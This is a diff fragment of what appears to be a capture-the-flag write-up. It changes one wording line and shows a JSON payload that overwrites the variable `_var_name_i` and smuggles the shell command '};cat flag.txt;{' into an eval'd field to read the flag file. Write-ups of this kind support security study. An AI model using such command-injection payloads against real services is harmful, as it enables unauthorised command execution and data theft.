@@ -44,7 +44,7 @@ after fuzzying around, we noticed that it allows arithmetic assignment, by provi
 
 Then we used this vulnerability to rewrite  `_var_name_i`  in such a way that some new variables used in evals would be somehow "double referenced".
 
-We ended up in :
+We ended up with this monstruosity :
 
 ```
 ["task _var_name_i=10","var_11","task _var_name_i=10",{"task _var_name_i=13":"=SHELL","var_10":"b"},"concat",{"ta":["ta","aT","task _var_name_i=10",{"task _var_name_i=13":"};cat flag.txt;{","var_12":"b"},"l00p"]}]
